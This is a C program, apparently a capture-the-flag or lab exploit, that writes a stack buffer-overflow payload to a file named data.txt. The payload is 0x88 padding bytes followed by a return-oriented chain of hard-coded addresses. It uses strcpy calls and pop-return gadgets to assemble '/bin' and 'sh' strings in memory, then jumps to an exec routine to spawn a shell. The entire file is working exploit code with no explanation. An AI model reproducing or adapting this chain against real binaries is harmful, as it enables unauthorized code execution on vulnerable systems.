#include <stdio.h>

int main (int argc, const char * argv[]) {
	int i;
	FILE * fp = fopen("data.txt", "w");
	void * pop2return = (void *)0x804859d;
	void * execCommand = (void *)0x80f112c;
	void * execCommandOff = execCommand + 4;
	void * binString = (void *)0x80c5ecc;
	void * shString = (void *)0x80c5ec8;
	void * strcpyAddr = (void *)0x806e0c0; // (void *)0x806e070;
	void * execCall = (void *)0x08048ed0;
	for (i = 0; i < 0x88; i++) {
		fprintf(fp, "a");
	}
	fwrite(&strcpyAddr, 4, 1, fp);
	fwrite(&strcpyAddr, 4, 1, fp);
	fwrite(&pop2return, 4, 1, fp);
	fwrite(&execCommand, 4, 1, fp);
	fwrite(&binString, 4, 1, fp);
	fwrite(&strcpyAddr, 4, 1, fp);
	fwrite(&pop2return, 4, 1, fp);
	fwrite(&execCommandOff, 4, 1, fp);
	fwrite(&shString, 4, 1, fp);
	fwrite(&execCall, 4, 1, fp);
	fclose(fp);
	return 0;
}
